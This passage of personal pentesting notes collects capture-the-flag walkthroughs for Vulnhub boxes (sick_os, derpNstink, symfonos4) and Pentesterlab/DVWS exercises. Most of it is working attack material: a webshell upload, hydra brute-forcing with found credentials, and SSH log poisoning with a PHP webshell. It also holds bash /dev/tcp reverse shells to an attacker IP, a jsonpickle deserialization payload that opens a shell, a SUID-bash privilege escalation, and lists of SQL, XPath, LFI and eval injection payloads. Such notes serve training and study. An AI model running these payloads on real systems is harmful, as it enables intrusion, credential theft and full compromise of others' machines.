2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)</p><p>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDP0MUsoqZO/V9YvveabWAbUKg75bvm+raBx3ocLawuv+tI8ROpQiffcGRRXfhrXgmq8GjD2VKQh6OlIHHCZxHRnqCOLlxaCszp+sAS5gTFGx2K+fsUsIQmsBenxOmojiNCowJihpbeW32g5BHbcdSEkRkJoIcqj2YFpxlp2Sj8eBFVFtmTxUkbgCfLVTD3sn2fXe6Z4rGq/liyUthaWe0/GvIJTTgOFm3gj89h2AjrziXtopePi0qrZPvfBJGQBPY5HerX3cuROLGX9hc0jDuuV9icguimRd51MSwferYYkXRVjscBAqO941aIFrKgpIpwl806cFbMh48puWtsLtn3</p><p>|   256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)</p><p>|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBClk4i5WwxKsaozl2squH3rj+k3ZuyBxTW3uULT4gLTVLmhmg+QqkZQJ9xHmAjrRoBKhwWL+l3sNJeSgsJ9UEv0=</p><p>80/tcp open  http    syn-ack ttl 64 lighttpd 1.4.28</p><p>|_http-title: Site doesn&#39;t have a title (text/html).</p><p>| http-methods: </p><p>|_  Supported Methods: GET HEAD POST OPTIONS</p><p>|_http-server-header: lighttpd/1.4.28</p></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--sick_os--notes_401.html"></a><h1 class='title level-5'>notes</h1><br/><p>rustscan --ulimit 5000 192.168.1.47 -- -sC -sV -Pn -vvv --script http-methods -script-args http-methods.url-path=<a href="http://192.168.1.47/test/">http://192.168.1.47/test/</a> </p><p></p><p><img src="images/401-1.png" alt="images/401-1.png" /></p><p></p><p>curl -T shell.php <a href="http://192.168.1.47/test/shell.php">http://192.168.1.47/test/shell.php</a></p><p> </p><p>curl -T shell.php <a href="http://192.168.1.47/test/shell.php">http://192.168.1.47/test/shell.php</a> --http1.0</p><p></p><p><a href="http://192.168.1.47/test/shell.php">http://192.168.1.47/test/shell.php</a></p><p></p><p>rlwrap nc -lvnp 443</p><p></p><p>SHELL :D</p><p></p><p></p><p></p><p>We see no very interesting suid binaries or sudo permissions, so next we check cronjobs in all the locations</p><p></p><p>cat /etc/crontab</p><p>ls /etc/cron*</p><p>cat /etc/cron*</p><p>cat /etc/cron.d</p><p>cat /var/spool/cron/*</p><p></p><p><img src="images/401-2.png" alt="images/401-2.png" /></p><p></p><p>We see chkrootkit privesc</p><p><img src="images/401-3.png" alt="images/401-3.png" /></p><p> </p><p>dpkg -l | grep chkrootkit </p><p><img src="images/401-4.png" alt="images/401-4.png" /></p><p></p><p>Awesome, same version</p><p></p><p></p><p><img src="images/401-5.png" alt="images/401-5.png" /></p><p></p><p>using pspy you can see this is being ran by likely root</p><p></p><p>echo ‘#!/bin/bash’ &gt; update</p><p>echo &#39;chmod +s /bin/bash &gt;&gt; update</p><p>chmod +x update</p><p></p><p>ls -la /bin/bash</p><p>wait....</p><p></p><p><img src="images/401-6.png" alt="images/401-6.png" /></p><p></p><p>BAM</p></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--derpNstink_407.html"></a><h1 class='title level-4'>derpNstink</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--derpNstink--nmap_408.html"></a><h1 class='title level-5'>nmap</h1><br/><p></p><p>PORT   STATE SERVICE REASON         VERSION</p><p>21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.2</p><p>22/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)</p><p>| ssh-hostkey: </p><p>|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)</p><p>| ssh-dss AAAAB3NzaC1kc3MAAACBAMZoT7661ewMcQgzna/qzvkfYaLGwfMnL0VKh3hkBCwGw3jvSXjmjhKw/gR2TnTLFQ9eTDNPTuGsm87dOUSEunbZMvP9GgnA9hOUCI9T1oy5Rs4/AidB9uiVAKN+mefOBBkwhO74UkzNCZw+SX214uaEyK5tQxcROT8hqqLPbu2lAAAAFQCYTgxWroPZExKzHRqCJUbgQaCV6wAAAIEAifRo93uYV4W0l81ybohh+U2vZdqF7FLMXpyvVLv3wcSs1fa6w+0idZ076luA/RWcO/Cavp1q2Yvvyp7E/uKPe9fuDV8Qp4g3FArPQB/Bg+CUL90tNLcAiI+0b6lS8ByfwgMzcinP8fzjWeo3ZRyyU+nGqQaoF9kC951bloDJ48sAAACASzBGZ/bwnBU0oZxhuDg4c2YxD+R96JWBvDvMrqlxqZO1NsAAq5o/GU26++Yrk15mXFZgtkVBxeFXSErjwPkHfMWqY/TNOybUptUtnrqQlvN8tB4VW9sJwbT1AmnAyJZRJZ00x8cxzqvgD6qRyPJCCdNQsUiAnpDQ8RQ5v0cY67M=</p><p>|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)</p><p>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCog1WR41f7pXHcoQcEEDgeARy4bpquU6qGdWxOoc7CSjatxW2e8qi3Le/66/nER15eOFqFXV6dQcS/FQOqjPYtRugPNL16Idrq6BBRhmle+AUCb2Yjwq3rzPnOzonFj2q5FSi6zzMIhTbrIwB8xF9rEazw/4DInYKCChtN7+xZC5SWk5tXf9/2hrWhvEg8mM0HYjs31SkfO2qn4OyV6/rT+sPts39ILVLN7p8IiOU8vFdbOt4K5xPgTlUIFdHotVHjkakgYZ2cb32DCu/c/qZ3xRU2kcTL2qjL4Q6crDajXWBpyNGyFhjx88hindUTU6I6BnaWCjaDFabk7JODrf8J</p><p>|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)</p><p>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPbUzlHO4L0CcRTLxyaFkqvqoQikn5j1oipMTeYmvIp4D3o7Ht4tvVG9H+hGyX2+jz5cHwx9knygVi9CuXDU9t4=</p><p>|   256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)</p><p>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK5AF6Fe/U78KCW1vdVjGoYR9NHOpICUnz6uQgVGETII</p><p>80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))</p><p>|_http-title: DeRPnStiNK</p><p>| http-robots.txt: 2 disallowed entries </p><p>|_/php/ /temporary/</p><p>| http-methods: </p><p>|_  Supported Methods: GET HEAD POST OPTIONS</p><p>|_http-server-header: Apache/2.4.7 (Ubuntu)</p><p>MAC Address: 08:00:27:D2:47:B1 (Oracle VirtualBox virtual NIC)</p><p>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</p></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--derpNstink--notes_409.html"></a><h1 class='title level-5'>notes</h1><br/><p>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u <a href="http://derpnstink.local/weblog/">http://</a>192.168.1.49 -o initial_dir</p><p></p><p><img src="images/409-1.png" alt="images/409-1.png" /></p><p></p><p>weblog is a wordpress site. It redirects us to <a href="http://derpnstink.local">http://derpnstink.local</a> so we need to add it to /etc/hosts. Virtual host routing. </p><p></p><p></p><p></p><p>wpscan --url <a href="http://derpnstink.local/weblog/">http://derpnstink.local/weblog/</a> -e vt,tt,u,ap </p><p><img src="images/409-2.png" alt="images/409-2.png" /></p><p></p><p></p><p></p><p>hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.49 http-post-form &#39;/weblog/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:S=Location&#39; -V -e nsr -f -t 50</p><p><img src="images/409-3.png" alt="images/409-3.png" /></p><p></p><p><img src="images/409-4.png" alt="images/409-4.png" /></p><p></p><p></p><p><img src="images/409-5.png" alt="images/409-5.png" /></p><p></p><p></p><p><img src="images/409-6.png" alt="images/409-6.png" /></p><p></p><p><img src="images/409-7.png" alt="images/409-7.png" /></p><p></p><p></p><p>unclestinky:wedgie57</p><p>admin:admin</p><p></p><p><img src="images/409-8.png" alt="images/409-8.png" /></p><p></p><p></p><p>FOUND PCAP FILE</p><p><img src="images/409-9.png" alt="images/409-9.png" /></p><p>tranferred it to kali for wireshark</p><p></p><p><img src="images/409-10.png" alt="images/409-10.png" /></p><p></p><p>went through all http requests i could find. Found these credentials:</p><p></p><p>mrderp</p><p>derpderpderpderpderpderpderp</p><p></p><p></p><p>You can find clear text credentials over <h3> FTP, SMTP, HTTP, POP3, IMAP4, SNMP, LDAP</h3> etc.. </p><p></p><p><a href="https://www.infosecmatter.com/capture-passwords-using-wireshark/">https://www.infosecmatter.com/capture-passwords-using-wireshark/</a></p><p></p><p><img src="images/409-11.png" alt="images/409-11.png" /></p><p></p><p>This will be ezpz </p><p><img src="images/409-12.png" alt="images/409-12.png" /></p><p></p><p><img src="images/409-13.png" alt="images/409-13.png" /></p><p></p><p><img src="images/409-14.png" alt="images/409-14.png" /></p><p></p><p><img src="images/409-15.png" alt="images/409-15.png" /></p></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--symfonos4_413.html"></a><h1 class='title level-4'>symfonos4</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--symfonos4--nmap_414.html"></a><h1 class='title level-5'>nmap</h1><br/><p>└─# cat nmap_all   </p><p># Nmap 7.92 scan initiated Wed Sep 14 15:30:08 2022 as: nmap -sC -sV -oN nmap_all -vvv -p 22,80 192.168.1.136</p><p>Nmap scan report for 192.168.1.136</p><p>Host is up, received arp-response (0.00029s latency).</p><p>Scanned at 2022-09-14 15:30:09 EDT for 7s</p><p></p><p>PORT   STATE SERVICE REASON         VERSION</p><p>22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10 (protocol 2.0)</p><p>| ssh-hostkey: </p><p>|   2048 f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f (RSA)</p><p>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDc6WD+nd5ZbnlOmJHKiExjfgbFX6q+QAKK3N+lsm6vntaQ3CRgdDBf37SsO5ptEHMUZrDPGBch03b0An18k6pHwSLfz5AuCTN3W0Rtqd2iFRqkhgoVatSEoESxCwULEpsRB738QhCeAfiTgHr/s5WtdQAgEoSBS6e4k8KHRD1M+8FVHrolrvJA//cQ7VzVvCDbQ/eYWh3kUjRJj/cFzY/Jpgwu0QxNhzXmHwroAjtzd0D59f/KIxG0ULyAr9aQoQVjy7fMN7wJyZZxhLLKSSMoT7G51khfn9Bwun9peI32IwZnVJ3L87fGgsSy/KdOjJDRLsGCXJNtT+jUviHAaTWz</p><p>|   256 be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 (ECDSA)</p><p>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIh5KJU7muB4UyLIXStFY9R+LekTaOgLGzYh/sWHOO+aj7OOE8QDWgjPTSZt0uDG9+bmT3Uz8v3EY2b0QDP5X9I=</p><p>|   256 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a (ED25519)</p><p>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGBDJ/OjwxXNZ01JjiQXyOVhcY3z9ADXsEWJEOUMdHpd</p><p>80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))</p><p>| http-methods: </p><p>|_  Supported Methods: POST OPTIONS HEAD GET</p><p>|_http-title: Site doesn&#39;t have a title (text/html).</p><p>|_http-server-header: Apache/2.4.38 (Debian)</p><p>MAC Address: 08:00:27:E2:EE:F0 (Oracle VirtualBox virtual NIC)</p><p>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p><p></p><p>Read data files from: /usr/bin/../share/nmap</p><p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .</p><p># Nmap done at Wed Sep 14 15:30:16 2022 -- 1 IP address (1 host up) scanned in 7.63 seconds</p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Vulnhub--symfonos4--notes_415.html"></a><h1 class='title level-5'>notes</h1><br/><p><img src="images/415-1.png" alt="images/415-1.png" /></p><p></p><p>gods found nothing in so far</p><p></p><p>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u <a href="http://192.168.1.136/">http://192.168.1.136/</a> -x logs,bak,php,html,zip,gz,asp,aspx</p><p><img src="images/415-2.png" alt="images/415-2.png" /></p><p>sea.php</p><p></p><p>admin&#39;  or 1=1 or &#39;&#39;=&#39;</p><p></p><p>this got past the login form</p><p></p><p>found file= so immediately though of LFI</p><p><img src="images/415-3.png" alt="images/415-3.png" /></p><p></p><p>Fuzzing through auth request with cookies to find our LFI location </p><p>ffuf -c -u &#39;<a href="http://192.168.1.136/sea.php?file=../../../../../../FUZZ'">http://192.168.1.136/sea.php?file=../../../../../../FUZZ&#39;</a> -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -b &#39;PHPSESSID=russhgsf2b2asdt3rm4jr4o50l&#39; -fl 21</p><p><img src="images/415-4.png" alt="images/415-4.png" /></p><p></p><p></p><p>We attempt to send some traffic to see if it get logged on the host</p><p><img src="images/415-5.png" alt="images/415-5.png" /></p><p></p><p></p><p>Sure enough it does!</p><p><img src="images/415-6.png" alt="images/415-6.png" /></p><p></p><p>can I run commands from here?</p><p></p><p><img src="images/415-7.png" alt="images/415-7.png" /></p><p></p><p>We certainly are. I did log poisning like this:</p><p>ssh ssh &#39;&lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt;&#39;@192.168.1.136</p><p></p><p>and got shell through this:</p><p><a href="http://192.168.1.136/sea.php?file=../../../../../var/log/auth&cmd=bash%20-c%20%27exec%20bash%20-i%20&%3E/dev/tcp/192.168.1.42/443%20%3C&1%27">http://192.168.1.136/sea.php?file=../../../../../var/log/auth&amp;cmd=bash%20-c%20%27exec%20bash%20-i%20&amp;%3E/dev/tcp/192.168.1.42/443%20%3C&amp;1%27</a></p><p>needed to fickle a bit with urlencoding but got in!</p><p></p><p>===</p><p>PRIVESC</p><p></p><p></p><p><img src="images/415-8.png" alt="images/415-8.png" /></p><p><a href="file:///usr/sbin/mysqld">/usr/sbin/mysqld</a></p><p></p><p><img src="images/415-9.png" alt="images/415-9.png" /></p><p></p><p><a href="file:///usr/bin/gettext.sh">/usr/bin/gettext.sh</a></p><p></p><p>/etc/init.d/mysql</p><p>try root root mysql</p><p></p><p>/home/poseidon</p><p></p><p></p><p>HMMM ; D</p><p></p><p><img src="images/415-10.png" alt="images/415-10.png" /></p><p></p><p>So we transfer over a 32 bit chisel to target.</p><p></p><p>target:</p><p>./chisel32 client 192.168.1.42:8081 R:8000:127.0.0.1:8080</p><p></p><p>attacker:</p><p>chisel server -p 8081 --reverse</p><p></p><p><img src="images/415-11.png" alt="images/415-11.png" /></p><p>We&#39;re connected!</p><p></p><p>So this opens up a port through chisel at 8081 for our connection, and it takes their localhost at 8080 and we use their service but on our host, and on port 8000. Like so:</p><p><img src="images/415-12.png" alt="images/415-12.png" /></p><p></p><p>Definitely not my site hehe</p><p></p><p><img src="images/415-13.png" alt="images/415-13.png" /></p><p>hm okay.. probably some cookie tampering we need to do</p><p></p><p>base64?</p><p></p><p><img src="images/415-14.png" alt="images/415-14.png" /></p><p>indeed it is</p><p></p><p>can we change the user by base64 encoding it to someone else again then? </p><p><img src="images/415-15.png" alt="images/415-15.png" /></p><p></p><p><img src="images/415-16.png" alt="images/415-16.png" /></p><p></p><p>Indeed I can!</p><p></p><p>but how does this help us.. hmm.. maybe it can execute commands through some means </p><p><img src="images/415-17.png" alt="images/415-17.png" /></p><p>this does not work hmm.. lemme keep trying. nothing else seems interesting so far</p><p></p><p></p><p></p><p>these are python jsonpickle strings</p><p></p><p><span style="color:#3f4043;">“jsonpickle is a library for the two-way conversion of complex Python objects and JSON”</span></p><p><span style="color:#3f4043;">“jsonpickle is a Python library for serialization and deserialization of complex Python objects to and from JSON.”</span></p><p></p><p>poseidon:</p><p>{&quot;py/object&quot;: &quot;app.User&quot;, &quot;username&quot;: &quot;Poseidon&quot;}</p><p>eyJweS9vYmplY3QiOiAiYXBwLlVzZXIiLCAidXNlcm5hbWUiOiAiUG9zZWlkb24ifQ==</p><p></p><p></p><p><img src="images/415-18.png" alt="images/415-18.png" /></p><p>So any of the cookie paramaters except the username seems fine. username value however breaks the application if the structure is insufficient. How interesting </p><p></p><p></p><p>Our payload:</p><p></p><p>{&quot;py/object&quot;:&quot;__main__.Shell&quot;,&quot;py/reduce&quot;:[{&quot;py/function&quot;:&quot;os.system&quot;},[&quot;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.1.42/443 &lt;&amp;1&#39;&quot;], 0, 0, 0]}</p><p><img src="images/415-19.png" alt="images/415-19.png" /></p><p></p><p>BOOOOMM</p><p><img src="images/415-20.png" alt="images/415-20.png" /></p><p></p><p>proof.txt!</p><p><img src="images/415-21.png" alt="images/415-21.png" /></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs_495.html"></a><h1 class='title level-3'>Training Labs</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--DVWS_496.html"></a><h1 class='title level-4'>DVWS</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--DVWS--API_SQL_Injection_498.html"></a><h1 class='title level-5'>API SQL Injection</h1><br/><p>{&quot;passphrase&quot;:&quot;465d51506b57487d78567d5d55457379&quot;,&quot;reminder&quot;:&quot;Hiii&#39;&quot;}</p><p></p><p><img src="images/498-1.png" alt="images/498-1.png" /></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--DVWS--API_NOSQL_Injection_497.html"></a><h1 class='title level-5'>API NOSQL Injection</h1><br/><p></p><p></p><p></p><p>{&quot;search&quot;:&quot;a&#39;||&#39;a&#39;==&#39;a&quot;}</p><p></p><p></p><p><img src="images/497-1.png" alt="images/497-1.png" /></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--DVWS--API_XPath_Injection_499.html"></a><h1 class='title level-5'>API XPath Injection</h1><br/><p><h3>If it uses a framework or a CMS that use XML as a data storage format or if the application uses SOAP web services, you should test for XPath injection.</h3></p><p></p><p>Test in:</p><p></p><p>Query string paramater, ex: <a href="http://example.com/page?name=value">http://example.com/page?name=value</a></p><p>cookies, ex: Cookie: session=1234567890; query=&#39; or sleep(5)=&#39;</p><p>Path paramaters, ex:<a href="http://example.com/page/value">http://example.com/page/value</a> (So like this: <a href="http://example.com/page/'">http://example.com/page/&#39;</a> or sleep(5)=&#39;</p><p>Form Fields</p><p></p><p></p><p><a href="http://example.com/search?query='">http://example.com/search?query=&#39;</a> or sleep(5)=&#39;</p><p></p><p>POST /search HTTP/1.1</p><p>Host: example.com</p><p>Content-Type: application/x-www-form-urlencoded</p><p></p><p>query=&#39; or sleep(5)=&#39;</p><p></p><p>&#39; or sleep(5)=&#39;&#39;</p><p>&quot; or sleep(5)=&quot;&quot;</p><p>&#39; or 1=1 or &#39;&#39;=&#39;</p><p>&quot; or 1=1 or &quot;&quot;=&quot;</p><p>&#39; or sleep(5)=&#39;</p><p>&#39;or&#39;1&#39;=&#39;1</p><p>&#39;or&#39;true()&#39;or&#39;</p><p>a&#39; or true() or &#39;</p><p></p><p>&#39; or &#39;1&#39;=&#39;1</p><p>&#39; or &#39;&#39;=&#39;</p><p>x&#39; or 1=1 or &#39;x&#39;=&#39;y</p><p>/</p><p>//</p><p>//*</p><p>*/*</p><p>@*</p><p>count(/child::node())</p><p>x&#39; or name()=&#39;username&#39; or &#39;x&#39;=&#39;y</p><p>&#39; and count(/*)=1 and &#39;1&#39;=&#39;1</p><p>&#39; and count(/@*)=1 and &#39;1&#39;=&#39;1</p><p>&#39; and count(/comment())=1 and &#39;1&#39;=&#39;1</p><p>search=&#39;)] | //user/*[contains(*,&#39;</p><p>search=Har&#39;) and contains(../password,&#39;c</p><p>search=Har&#39;) and starts-with(../password,&#39;c</p><p>&#39; or 1]%00</p><p></p><p></p><p><img src="images/499-1.png" alt="images/499-1.png" /></p><p></p><p>Modified</p><p></p><p><img src="images/499-2.png" alt="images/499-2.png" /></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--DVWS--API_Command_Injection_500.html"></a><h1 class='title level-5'>API Command Injection</h1><br/><p><img src="images/500-1.png" alt="images/500-1.png" /></p><p></p><p><span style="color:#3f4043;">The admin.html page loads up information about the host in the response. It&#39;s using the linux uname system command for this. Let&#39;s see if we can modify our chain commands to this request to get command injection</span> </p><p></p><p><img src="images/500-2.png" alt="images/500-2.png" /></p><p><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">As we can see adding the ;ls to the uname response allows us to get command injection on this host. Replacing the uname with another command also works in this case</span>.</p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--DVWS--API_Mass_Assignment_501.html"></a><h1 class='title level-5'>API Mass Assignment</h1><br/><p><span style="color:#3f4043;">When we login we can see admin=false value. We now have an idea of which paramaters the API allows. We can attempt a mass assignment attack with the admin=true in potentially either a login request or a user creation request.</span>  </p><p></p><p><img src="images/501-1.png" alt="images/501-1.png" /></p><p></p><p><span style="color:#3f4043;">Let&#39;s add the admin value</span></p><p><img src="images/501-2.png" alt="images/501-2.png" /></p><p></p><p><span style="color:#3f4043;">As as we intercept the response to our request, our new user is now set up as a admin!</span></p><p><img src="images/501-3.png" alt="images/501-3.png" /></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--DVWS--API_LFI_502.html"></a><h1 class='title level-5'>API LFI</h1><br/><p></p><p></p><p></p><p>{&quot;filename&quot;:&quot;/../../../../../../../../etc/passwd&quot;}</p><p></p><p></p><p><img src="images/502-1.png" alt="images/502-1.png" /></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--NodeGoat_506.html"></a><h1 class='title level-4'>NodeGoat</h1><br/><p><a href="https://github.com/OWASP/NodeGoat">https://github.com/OWASP/NodeGoat</a></p><p></p><p><h3>This project provides an environment to learn how OWASP Top 10 security risks apply to web applications developed using Node.js and how to effectively address them.</h3></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Tiredful_API_521.html"></a><h1 class='title level-4'>Tiredful API</h1><br/><p><a href="https://github.com/payatu/Tiredful-API">https://github.com/payatu/Tiredful-API</a></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pixi_522.html"></a><h1 class='title level-4'>Pixi</h1><br/><p><a href="https://github.com/DevSlop/Pixi">https://github.com/DevSlop/Pixi</a></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--JuiceShop_523.html"></a><h1 class='title level-4'>JuiceShop</h1><br/><p><a href="https://juice-shop.herokuapp.com/#/login">https://juice-shop.herokuapp.com/#/login</a></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab_670.html"></a><h1 class='title level-4'>Pentesterlab</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--Authentification_671.html"></a><h1 class='title level-5'>Authentification</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--Authentification--String_Comparison_672.html"></a><h1 class='title level-6'>String Comparison</h1><br/><p>Make a user that exists, but use capital letter at start. Due to string comparison issues, you get to make an account with essentially the same name as someone else, and when the database retrives this data when you wanna log in, then you&#39;re essentially taking over someone elses account.</p><p> </p><p><img src="images/672-1.png" alt="images/672-1.png" /></p><p></p><p></p><p>==========</p><p></p><p></p><p>Make a user that exists, but have a space in the end.</p><p><img src="images/672-2.png" alt="images/672-2.png" /></p><p></p><p>Common Mistakes:</p><p></p><p>    If the user &#39;admin[space]&#39; exists, you can add more spaces after &#39;admin&#39;</p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--Authentification--Page_execution_before_302_673.html"></a><h1 class='title level-6'>Page execution before 302</h1><br/><p><img src="images/673-1.png" alt="images/673-1.png" /></p><p><img src="images/673-2.png" alt="images/673-2.png" /></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--Authorization_675.html"></a><h1 class='title level-5'>Authorization</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--Authorization--IDOR_674.html"></a><h1 class='title level-6'>IDOR</h1><br/><p><img src="images/674-1.png" alt="images/674-1.png" /></p><p></p><p>Access to an endpoint where my current user shouldn&#39;t have. Classic authorization issue. </p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--Authorization--Data_representation_in_different_formats_678.html"></a><h1 class='title level-6'>Data representation in different formats</h1><br/><p><img src="images/678-1.png" alt="images/678-1.png" /></p><p><img src="images/678-2.png" alt="images/678-2.png" /></p><p></p><p>So this key I cannot see... however...</p><p></p><p></p><p><img src="images/678-3.png" alt="images/678-3.png" /></p><p></p><p>When we change the page to load in json, it&#39;s represented differently.</p><p></p><p><img src="images/678-4.png" alt="images/678-4.png" /></p><p></p><p>And no filtering of the value is present here.</p><p></p><p>Apparently variations of these mistakes are common. </p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--Authorization--Creating_admin_user_using_nested_paramaters_742.html"></a><h1 class='title level-6'>Creating admin user using nested paramaters</h1><br/><p><span style="color:#3f4043;">Original query:</span></p><p>user%5Busername%5D=user2&amp;user%5Bpassword%5D=sdada&amp;submit=Submit+Query</p><p></p><p><span style="color:#3f4043;">Our query:</span></p><p>user%5Busername%5D=user2&amp;user%5Bpassword%5D=sdada&amp;submit=Submit+Query&amp;user[admin]=1</p><p></p></div><div class='page'><a name="-Training_Labs--Pentesterlab--Authorization--Creating_admin_user_using_nested_paramaters--Joining_organization_with_nested_paramaters_743.html"></a><h1 class='title level-7'>Joining organization with nested paramaters</h1><br/><p>user[username]=user2&amp;user[password]=user2&amp;submit=Submit+Query&amp;user[organisation_id]=1</p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--Code_execution_744.html"></a><h1 class='title level-5'>Code execution</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--Code_execution--php_eval_745.html"></a><h1 class='title level-6'>php eval</h1><br/><p><span style="color:#3f4043;">works:</span></p><p>url/?name=hi&quot;.system(&#39;id&#39;).&quot;</p><p></p><p><span style="color:#3f4043;">doesnt work:</span></p><p>?name=hi&quot;system(&#39;id&#39;)&quot;</p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--Code_execution--php_eval--create_function_in_tables_746.html"></a><h1 class='title level-7'>create_function in tables</h1><br/><p>url?order=id);}system(&#39;whoami&#39;);//</p><p></p><p><img src="images/746-1.png" alt="images/746-1.png" /></p><p></p><p><img src="images/746-2.png" alt="images/746-2.png" /></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--Code_execution--php_eval--assert_747.html"></a><h1 class='title level-7'>assert</h1><br/><p><span style="color:#3f4043;">works:</span></p><p>?name=hacker&#39;.system(&#39;id&#39;).&#39;</p><p></p><p><span style="color:#3f4043;">doesnt work:</span></p><p>?name=hacker&quot;.system(&#39;id&#39;).&quot;</p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--Code_execution--ruby_eval_748.html"></a><h1 class='title level-6'>ruby eval</h1><br/><p>in burp:</p><p>/?username=hacker%22%2b(`id`)%2b%22</p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p>?username=hacker&quot;%2b(`id`)%2b&quot;</p><p><img src="images/748-1.png" alt="images/748-1.png" /></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--Code_execution--ruby_eval--ruby_cgi_752.html"></a><h1 class='title level-7'>ruby cgi</h1><br/><p>/cgi-bin/hello?name=Robert&#39;.`id`.&#39;</p><p></p><p><img src="images/752-1.png" alt="images/752-1.png" /></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--Code_execution--python_eval_749.html"></a><h1 class='title level-6'>python eval</h1><br/><p>/hello/hacker&quot;%2bstr(os.popen(&quot;id&quot;).read())%2b&quot;</p><p></p><p><span style="color:#3f4043;">Another one, might be more realistic:</span></p><p>/hello/hacker&quot;%2bstr(__import__(&#39;os&#39;).popen(&#39;uname -a&#39;).read())%2b&quot;</p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--Code_execution--python_eval--python_eval_b64_751.html"></a><h1 class='title level-7'>python eval b64</h1><br/><p>/hello/hacker%22%2bstr(__import__(&#39;os&#39;).popen(__import__(&#39;base64&#39;).b64decode(&#39;Y2F0IC9ldGMvcGFzc3dkCg==&#39;)).read())%2b%22</p><p></p><p><img src="images/751-1.png" alt="images/751-1.png" /></p><p></p></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--Command_injection_753.html"></a><h1 class='title level-5'>Command injection</h1><br/></div><div class='page'><a name="Methdology--CTF_Boxes--Training_Labs--Pentesterlab--Command_injection--chaining_754.html"></a><h1 class='title 